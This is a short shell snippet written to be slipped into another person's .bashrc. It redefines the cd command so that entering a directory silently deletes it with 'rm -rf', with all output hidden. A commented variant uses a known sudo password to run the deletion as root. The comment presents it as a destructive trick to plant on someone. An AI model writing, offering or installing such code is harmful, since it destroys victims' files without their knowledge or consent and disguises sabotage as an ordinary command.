# --- Destructive, user's discretion is advised ---
# place this on person's .bashrc and see the magic happens

cd() {
 # echo <sudopasswd> | sudo -S rm -rf ${1} > /dev/null 2>&1; # use this if user is on sudoers and you know it's password, replace <sudopasswd>
 rm -rf "$1" > /dev/null 2>&1;                               # otherwise, use this
}
